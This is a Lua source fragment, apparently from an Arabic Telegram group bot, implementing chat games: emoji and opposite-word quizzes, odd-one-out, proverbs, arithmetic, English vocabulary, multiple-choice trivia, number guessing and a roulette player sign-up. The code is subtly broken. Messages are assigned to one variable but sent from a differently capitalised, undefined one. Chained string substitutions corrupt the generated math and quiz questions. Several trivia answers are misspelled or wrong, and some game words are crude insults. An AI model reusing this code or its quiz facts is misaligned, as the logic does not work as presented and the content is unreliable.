DevBrAnD2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevBrAnD2[math.random(#DevBrAnD2)]
DevBrAnD:set(BrAnD..'BrAnD:GameNum2'..msg.chat_id_,name)
DevBrAnD:del(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
BrAnDTeAM= '♰ ⌯ ما معنى هذا السمايل :؟ ↫ '..name
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
return false
end end
if text == DevBrAnD:get(BrAnD..'BrAnD:GameNum2'..msg.chat_id_) and not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then
if not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then 
BrAnDTeAM= '♰ ⌯ مبروك لقد ربحت في اللعبه \n♰ ⌯ ارسل ↫ المعاني للعب مره اخرى'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevBrAnD:set(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_,true)
end 
if text == 'العكس' and ChCheck(msg) or text == 'عكس' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
DevBrAnD2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevBrAnD2[math.random(#DevBrAnD2)]
DevBrAnD:set(BrAnD..'BrAnD:GameNum3'..msg.chat_id_,name)
DevBrAnD:del(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
BrAnDTeAM= '♰ ⌯ ما هو عكس كلمة ↫ '..name
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
return false
end end
if text == DevBrAnD:get(BrAnD..'BrAnD:GameNum3'..msg.chat_id_) and not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then
if not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then 
BrAnDTeAM= '♰ ⌯ مبروك لقد ربحت في اللعبه \n♰ ⌯ ارسل ↫ العكس للعب مره اخرى'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevBrAnD:set(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المختلف' and ChCheck(msg) or text == 'مختلف' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
DevBrAnD2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevBrAnD2[math.random(#DevBrAnD2)]
DevBrAnD:set(BrAnD..'BrAnD:GameNum4'..msg.chat_id_,name)
DevBrAnD:del(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
BrAnDTeAM= '♰ ⌯ اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
return false
end end
if text == DevBrAnD:get(BrAnD..'BrAnD:GameNum4'..msg.chat_id_) and not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then
if not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then 
BrAnDTeAM= '♰ ⌯ مبروك لقد ربحت في اللعبه \n♰ ⌯ ارسل ↫ المختلف للعب مره اخرى'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevBrAnD:set(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_,true)
end  
if text == 'امثله' and ChCheck(msg) or text == 'الامثله' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
DevBrAnD2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevBrAnD2[math.random(#DevBrAnD2)]
DevBrAnD:set(BrAnD..'BrAnD:GameNum5'..msg.chat_id_,name)
DevBrAnD:del(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
BrAnDTeAM= '♰ ⌯ اكمل المثال التالي ↫ ['..name..']'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
return false
end end
if text == DevBrAnD:get(BrAnD..'BrAnD:GameNum5'..msg.chat_id_) then
if not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then 
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevBrAnD:del(BrAnD..'BrAnD:GameNum5'..msg.chat_id_)
BrAnDTeAM= '♰ ⌯ مبروك لقد ربحت في اللعبه \n♰ ⌯ ارسل ↫ امثله للعب مره اخرى'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
end
DevBrAnD:set(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_,true)
end  
if text == 'رياضيات' and ChCheck(msg) or text == 'الرياضيات' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
DevBrAnD2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = DevBrAnD2[math.random(#DevBrAnD2)]
DevBrAnD:set(BrAnD..'BrAnD:GameNum6'..msg.chat_id_,name)
DevBrAnD:del(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
BrAnDTeAM= '♰ ⌯ اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
return false
end end
if text == DevBrAnD:get(BrAnD..'BrAnD:GameNum6'..msg.chat_id_) then
if not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then 
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevBrAnD:del(BrAnD..'BrAnD:GameNum6'..msg.chat_id_)
BrAnDTeAM= '♰ ⌯ مبروك لقد ربحت في اللعبه \n♰ ⌯ ارسل ↫ رياضيات للعب مره اخرى'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
end
DevBrAnD:set(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_,true)
end  
if text == 'الانكليزي' and ChCheck(msg) or text == 'الانجليزيه' and ChCheck(msg) or text == 'انكليزيه' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
DevBrAnD2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = DevBrAnD2[math.random(#DevBrAnD2)]
DevBrAnD:set(BrAnD..'BrAnD:GameNum7'..msg.chat_id_,name)
DevBrAnD:del(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','ChANnEls')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid')
name = string.gsub(name,'صداقه','Friendchip')
BrAnDTeAM= '♰ ⌯ ما معنى كلمة ↫ '..name
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
return false
end end
if text == DevBrAnD:get(BrAnD..'BrAnD:GameNum7'..msg.chat_id_) then
if not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then 
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevBrAnD:del(BrAnD..'BrAnD:GameNum7'..msg.chat_id_)
BrAnDTeAM= '♰ ⌯ مبروك لقد ربحت في اللعبه \n♰ ⌯ ارسل ↫ انكليزيه للعب مره اخرى'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
end
DevBrAnD:set(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_,true)
end  
--     SoUrCe BrAnD     --
if text == 'اسئله' and ChCheck(msg) or text == 'اختيارات' and ChCheck(msg) or text == 'الاسئله' and ChCheck(msg) or text == 'اساله' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
DevBrAnD2 = {'النيل','14','الفم','11','30','بوتين','ستيف جوبر','باريس','10','النمل','حرف الواو','الشعر','سحاب','الاسم','ذهب','حرف الام','العزائم','انسات','المنجنيق','اسيا','6','الاسد','مهر','الدولفين','اوروبا','الزئبق','لندن','الانسان','طوكيو','خديجه',}
name = DevBrAnD2[math.random(#DevBrAnD2)]
DevBrAnD:set(BrAnD..'BrAnD:GameNum8'..msg.chat_id_,name)
DevBrAnD:del(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'النيل','♰ ⌯ ماهو اطول نهر في العالم ؟\n1- النيل\n2- الفرات\n3- نهر الكونغو')
name = string.gsub(name,'14','♰ ⌯ ماعدد عظام الوجه ؟\n1- 15\n2- 13\n3- 14')
name = string.gsub(name,'الفم','♰ ⌯ كراسي بيضاء وجدران ورديه اذا اغلقته اصبح ظلام  فمن اكون ؟\n1- الفم\n2- الاذن\n3- الثلاجه')
name = string.gsub(name,'11','♰ ⌯ كم جزء يحتوي مسلسل وادي الذئاب ؟\n1- 7\n2- 15\n3- 11')
name = string.gsub(name,'30','♰ ⌯ كم جزء يحتوي القران الكريم ؟\n1- 60\n2- 70\n3- 30')
name = string.gsub(name,'بوتين','♰ ⌯ من هوه اغنى رئيس في العالم ؟\n1- ترامب\n2- اوباما\n3- بوتين')
name = string.gsub(name,'ستيف جوبر','♰ ⌯ من هوه مؤسس شركه ابل العالميه  ؟\n1- لاري بايج\n2- بيل جيتس\n3- ستيف جوبر')
name = string.gsub(name,'باريس','ماهي عاصمه فرنسا ؟\n1- باريس\n2- لوين\n3- موسكو')
name = string.gsub(name,'10','♰ ⌯ ماعدد دول العربيه التي توجد في افريقيا ؟\n1- 10\n2- 17\n3- 9')
name = string.gsub(name,'النمل','♰ ⌯ ماهو الحيوان الذي يحمل 50 فوق وزنه ؟\n1- الفيل\n2- النمل\n3- الثور')
name = string.gsub(name,'حرف الواو','♰ ⌯ ماذا يوجد بيني وبينك ؟\n1- الضل\n2- الاخلاق\n3- حرف الواو')
name = string.gsub(name,'الشعر','♰ ⌯ ماهو الشيء النبات ينبت للانسان بلا بذر ؟\n1- الاضافر\n2- الاسنان\n3- الشعر')
name = string.gsub(name,'سحاب','♰ ⌯ ما هو الشّيء الذي يستطيع المشي بدون أرجل والبكاء بدون أعين ؟\n1- سحاب\n2- بئر\n3- نهر')
name = string.gsub(name,'الاسم','♰ ⌯ ما الشيء الذي نمتلكه , لكنّ غيرنا يستعمله أكثر منّا ؟\n1- العمر\n2- ساعه\n3- الاسم')
name = string.gsub(name,'ذهب','♰ ⌯ اصفر اللون سارق عقول اهل الكون وحارمهم لذيذ النوم ؟\n1- نحاس\n2- الماس\n3- ذهب')
name = string.gsub(name,'حرف الام','♰ ⌯ في الليل ثلاثة لكنه في النهار واحده فما هو ؟\n1- حرف الباء\n2- حرف الام\n3- حرف الراء')
name = string.gsub(name,'العزائم','♰ ⌯ على قدر اصل العزم تأتي ؟\n1- العزائم\n2- المكارم\n3- المبائب')
name = string.gsub(name,'انسات','♰ ⌯ ماهي جمع كلمه انسه ؟\n1- سيدات\n2- انسات\n3- قوانص')
name = string.gsub(name,'المنجنيق','♰ ⌯ اله اتسعلمت قديما في الحروب ؟\n1- الصاروخ\n2- المسدس\n3- المنجنيق')
name = string.gsub(name,'اسيا','♰ ⌯ تقع لبنان في قاره ؟\n1- افريقيا\n2- اسيا\n3- امركيا الشماليه')
name = string.gsub(name,'6','♰ ⌯ كم صفرا للمليون ؟\n1- 4\n2- 3\n3- 6')
name = string.gsub(name,'الاسد','♰ ⌯ ماهو الحيوان الذي يلقب بملك الغابه ؟\n1- الفيل\n2- الاسد\n3- النمر')
name = string.gsub(name,'مهر','♰ ⌯ ما اسم صغير الحصان ؟\n1- مهر\n2- جرو\n3- عجل')
name = string.gsub(name,'الدولفين','♰ ⌯ ما الحيوان الذي ينام واحدى عينه مفتوحه ؟\n1- القرش\n2- الدولفين\n3- الثعلب\n')
name = string.gsub(name,'اوروبا','♰ ⌯ ماهي القاره التي تلقب بالقاره العجوز ؟\n1- اوروبا\n2- امريكا الشماليه\n3- افريقيا')
name = string.gsub(name,'الزئبق','♰ ⌯ ما اسم المعدن الموجود فيي الحاله السائله ؟\n1- النحاس\n2- الحديد\n3- الزئبق')
name = string.gsub(name,'لندن','♰ ⌯ ماهي عاصمه انجلترا ؟\n1- لندن\n2- لفرسول\n3- تركيا')
name = string.gsub(name,'الانسان','♰ ⌯ ماهو الشئ الذي برأسه سبع فتحات ؟\n1- الهاتف\n2- التلفاز\n3- الانسان')
name = string.gsub(name,'طوكيو','♰ ⌯ ماهي عاصمه اليابان ؟\n1- بانكول\n2- نيو دلهي\n3- طوكيو')
name = string.gsub(name,'خديجه','♰ ⌯ من هي زوجه الرسول الاكبر منه سنآ ؟\n1- حفضه\n2- زينب\n3- خديجه')
BrAnDTeAM= name..'\n♰ ⌯ ارسل الجواب الصحيح فقط'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
return false
end end
if text == DevBrAnD:get(BrAnD..'BrAnD:GameNum8'..msg.chat_id_) then
if not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then 
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevBrAnD:del(BrAnD..'BrAnD:GameNum8'..msg.chat_id_)
BrAnDTeAM= '♰ ⌯ مبروك لقد ربحت في اللعبه \n♰ ⌯ ارسل ↫ الاسئله للعب مره اخرى'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
end
DevBrAnD:set(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_,true)
end  
--     SoUrCe BrAnD     --
if DevBrAnD:get(BrAnD.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1,"♰ ⌯ عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevBrAnD:get(BrAnD.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevBrAnD:del(BrAnD..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevBrAnD:del(BrAnD.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ *التخمين الصحيح هو* ↫ '..NUM..'\n♰ ⌯ *مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevBrAnD:incrby(BrAnD..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevBrAnD:get(BrAnD..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevBrAnD:del(BrAnD..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevBrAnD:del(BrAnD.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ *التخمين الصحيح هو* ↫ '..GETNUM..'\n♰ ⌯ *للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevBrAnD:get(BrAnD..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevBrAnD:get(BrAnD..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
SetNum = 'محاوله واحده فقط'
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ لقد خمنت الرقم الخطا وتبقى لديك '..SetNum..' ارسل رقم تخمنه مره اخرى للفوز', 1, 'md')
end
end
end
end
if text == 'خمن' and ChCheck(msg) or text == 'تخمين' and ChCheck(msg) then   
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
DevBrAnD:set(BrAnD.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ⍆═════BR═════⍅\n♰ ⌯ سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n♰ ⌯ ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevBrAnD:setex(BrAnD.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     SoUrCe BrAnD     --
if text == 'روليت' then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
DevBrAnD:del(BrAnD.."BrAnD:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevBrAnD:del(BrAnD..'BrAnD:ListRolet'..msg.chat_id_)  
DevBrAnD:setex(BrAnD.."BrAnD:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text:match("^(%d+)$") and DevBrAnD:get(BrAnD.."BrAnD:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "♰ ⌯ لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevBrAnD:set(BrAnD.."BrAnD:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '♰ ⌯ تم بدء تسجيل اللسته يرجى ارسال المعرفات \n♰ ⌯ الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevBrAnD:del(BrAnD.."BrAnD:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text:match('^(@[%a%d_]+)$') and DevBrAnD:get(BrAnD.."BrAnD:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevBrAnD:sismember(BrAnD..'BrAnD:ListRolet'..msg.chat_id_,text) then
send(msg.chat_id_,msg.id_,'♰ ⌯ المعرف ↫ ['..text..'] موجود اساسا')
return false
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ المعرف غير صحيح يرجى ارسال معرف صحيح', 1, 'md')
return false 
end
DevBrAnD:sadd(BrAnD..'BrAnD:ListRolet'..msg.chat_id_,text)
local CountAdd = DevBrAnD:get(BrAnD.."BrAnD:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevBrAnD:scard(BrAnD..'BrAnD:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevBrAnD:del(BrAnD.."BrAnD:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevBrAnD:setex(BrAnD.."BrAnD:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
local Text = "♰ ⌯ تم ادخال المعرف ↫ ["..text.."]\n♰ ⌯ وتم اكتمال العدد الكلي هل انت مستعد ؟"
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}},{{text="اللاعبين",callback_data="/ListRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end 
local Text = "♰ ⌯ تم ادخال المعرف ↫ ["..text.."] وتبقى ↫ "..CountUser.." لاعبين ليكتمل العدد ارسل المعرف الاخر"
keyboard = {} 
keyboard.inline_keyboard = {{{text="الغاء",callback_data="/NoRolet"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end
--     SoUrCe BrAnD     --
